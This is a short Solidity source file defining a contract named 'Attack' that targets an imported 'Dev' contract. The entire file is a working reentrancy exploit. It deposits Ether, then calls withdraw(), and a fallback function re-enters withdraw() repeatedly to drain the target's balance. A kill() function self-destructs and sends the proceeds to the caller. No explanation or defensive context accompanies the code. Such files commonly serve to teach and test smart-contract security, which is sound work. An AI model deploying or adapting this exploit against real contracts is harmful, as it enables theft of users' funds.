pragma solidity ^0.4.8;
import "./Dev.sol";

contract Attack {

  Dev public dev;

  function Attack (address _dev) {
    dev = Dev(_dev);
  }

  function kill () {
    suicide(msg.sender);
  }

  function collect() payable {
    dev.transfer(msg.value);
    dev.withdraw();
  }

  function () payable {
    if (dev.balance >= msg.value) {
      dev.withdraw();
    }
  }
}